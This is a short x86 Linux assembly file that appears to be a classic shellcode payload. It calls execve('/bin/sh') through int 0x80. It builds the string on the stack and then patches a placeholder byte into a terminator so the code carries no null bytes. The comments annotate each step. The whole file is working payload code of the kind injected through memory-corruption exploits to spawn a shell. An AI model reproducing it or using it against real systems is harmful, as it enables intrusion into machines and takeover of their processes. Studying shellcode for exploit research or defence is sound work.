	.text
.globl _start
_start:
	xorl	%ecx, %ecx
	mull	%ecx		# %ecx = %eax = %edx = 0
	addb	$11, %al	# %eax = __NR_execve
	pushl	$0x0168732f	# Xhs/	(X to be nulled)
	pushl	$0x6e69622f	# nib/
	movl	%esp, %ebx	# arg 1 to exec is /bin/sh
	subb	$1, 7(%esp)
	int	$0x80		# sys_execve("/bin/sh", NULL, NULL)
